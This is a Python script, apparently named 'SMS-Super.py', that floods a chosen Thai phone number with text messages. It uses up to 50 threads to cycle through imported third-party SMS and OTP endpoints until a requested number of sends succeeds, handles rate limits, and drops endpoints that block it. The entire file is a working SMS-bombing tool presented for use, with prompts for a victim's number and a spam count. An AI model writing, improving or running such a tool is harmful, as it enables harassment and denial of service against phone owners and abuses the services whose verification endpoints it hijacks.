# program/SMS-Super.py
import requests
import threading
import time
import sys
import random
from API_LIST import API_CONFIG 

# ==========================================
# COLOR & STYLE SYSTEM
# ==========================================
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    C_GREEN = Fore.GREEN + Style.BRIGHT
    C_RED = Fore.RED + Style.BRIGHT
    C_YELLOW = Fore.YELLOW + Style.BRIGHT
    C_CYAN = Fore.CYAN + Style.BRIGHT
    C_WHITE = Fore.WHITE + Style.DIM   # A lighter white for less emphasis
    C_RESET = Style.RESET_ALL
except ImportError:
    C_GREEN = C_RED = C_YELLOW = C_CYAN = C_WHITE = C_RESET = ""

# ==========================================
# UTILS
# ==========================================
MAX_THREADS = 50   
TIMEOUT_SEC = 8     # A timeout for API requests in seconds
MAX_RETRIES = 3     # Maximum consecutive failures before considering an API as "banned"

lock = threading.Lock()
success_total = 0

# Dictionary to keep track of failed attempts for each API: {api_name: fail_count}
api_fail_counts = {k: 0 for k in API_CONFIG.keys()}
banned_apis = set()

def clean_phone(phone):
    phone = "".join(filter(str.isdigit, phone.strip()))
    if phone.startswith("66"): return "0" + phone[2:]
    if phone.startswith("+66"): return "0" + phone[3:]
    return phone

def shoot_api(phone, api_key):
    global success_total
    
    # Check if the API is already banned
    if api_key in banned_apis: return

    cfg = API_CONFIG.get(api_key)
    if not cfg: return

    try:
        url = cfg["url"].format(phone=phone) if "{phone}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"]()
        data_input = cfg["data"](phone) if cfg["data"] else None
        
        kwargs = {"headers": headers, "timeout": TIMEOUT_SEC}
        if isinstance(data_input, dict): kwargs["json"] = data_input
        elif isinstance(data_input, str): kwargs["data"] = data_input

        response = requests.request(cfg["method"], url, **kwargs)
        
        # --- LOGIC ---
        is_success = False
        should_ban = False
        
        # Check for success based on the API's success_check function if provided
        if cfg.get("success_check"):
            if cfg["success_check"](response.text):
                is_success = True
        else:
            # Fallback success check: if status code is 200 or 201 and response doesn't contain "error"
            if response.status_code in (200, 201) and "error" not in response.text.lower():
                is_success = True

        if is_success:
            with lock:
                success_total += 1
                # Reset the fail count for this API since it succeeded
                api_fail_counts[api_key] = 0
                print(f"{C_GREEN} SEND COMPLETE ({success_total}) | API: {cfg['name']}{C_RESET}")
        
        else:
            # Handle failure cases
            status = response.status_code
            
            # If the status code is 429 (Too Many Requests), we don't count it as a failure, just skip this attempt
            if status == 429: # Too Many Requests
                print(f"{C_YELLOW} API {cfg['name']} rate limited (Status 429) -> Skipping this attempt{C_RESET}")
                return 
            
            # If the status code is 403 or 401, it indicates a potential ban or invalid credentials
            if status in (403, 401): # Forbidden or Unauthorized
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED} API {cfg['name']} is banned or unauthorized (Status {status}) -> Removing from active list!{C_RESET}")
                        banned_apis.add(api_key)
                should_ban = True
            
            # If the status code is 500 or 503, it indicates a server error, we can retry but count it as a failure
            else:
                with lock:
                    api_fail_counts[api_key] += 1
                    if api_fail_counts[api_key] >= MAX_RETRIES:
                        should_ban = True

            if should_ban:
                with lock:
                    if api_key not in banned_apis:
                        print(f"{C_RED} API {cfg['name']} BANNED (Status {status}) -> Removing from active list!{C_RESET}")
                        banned_apis.add(api_key)

    except Exception:
        # Handle network errors or unexpected exceptions
        with lock:
            api_fail_counts[api_key] += 1
            if api_fail_counts[api_key] >= MAX_RETRIES:
                if api_key not in banned_apis:
                    print(f"{C_RED} API {cfg['name']} CONNECTION FAILED {MAX_RETRIES}  TIMES -> Removing from active list!{C_RESET}")
                    banned_apis.add(api_key)

def start_super_spam(phone, target_amount):
    print(f"\n{C_CYAN} SUPER SPAM V.4 (Smart Logic) TO: {phone}{C_RESET}")
    print(f"{C_CYAN}HIT TARGET: {target_amount}TIMES {C_RESET}")
    print(f"{C_WHITE} SYSTEM WILL REMOVE API AFTER {MAX_RETRIES}  CONSECUTIVE FAILURES {C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

    all_api_keys = list(API_CONFIG.keys())
    threads = []
    attempt_count = 0 
    
    while success_total < target_amount:
        # Filter out banned APIs for this round
        active_apis = [k for k in all_api_keys if k not in banned_apis]
        
        if not active_apis:
            print(f"\n{C_RED}DON'T HAVE ANY ACTIVE APIS LEFT{C_RESET}")
            break

        # Select an API key in a round-robin fashion
        api_key = active_apis[attempt_count % len(active_apis)]
        
        # Start a new thread to shoot the API
        t = threading.Thread(target=shoot_api, args=(phone, api_key))
        threads.append(t)
        t.start()
        attempt_count += 1

        # Control the number of concurrent threads
        threads = [t for t in threads if t.is_alive()]
        while len(threads) >= MAX_THREADS:
            time.sleep(0.05)
            threads = [t for t in threads if t.is_alive()]
        
        time.sleep(0.01)

    # Wait for all threads to finish
    for t in threads: t.join()

    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")
    print(f"{C_GREEN}SUCCESS!{C_RESET}")
    print(f" HIT TARGET: {C_GREEN}{success_total}/{target_amount}{C_RESET}")
    print(f" TOTAL ATTEMPTS: {attempt_count} | ACTIVE APIS: {len(active_apis)} | BANNED APIS: {len(banned_apis)}")
    print(f" BANNED APIS: {C_RED}{len(banned_apis)}{C_RESET}")
    print(f"{C_YELLOW}" + "-" * 50 + f"{C_RESET}")

if __name__ == "__main__":
    try:
        phone_input = input(f"{C_YELLOW} Phone Number: {C_RESET}")
        clean_p = clean_phone(phone_input)
        
        if len(clean_p) != 10:
            print(f"{C_RED} Invalid phone number{C_RESET}")
            sys.exit()

        amount_input = input(f"{C_YELLOW} Number of successes desired: {C_RESET}")
        amount = int(amount_input)

        start_super_spam(clean_p, amount)
        
    except ValueError:
        print(f"{C_RED} Please enter only numbers{C_RESET}")
    except KeyboardInterrupt:
        print(f"\n{C_RED}Operation cancelled by user{C_RESET}")
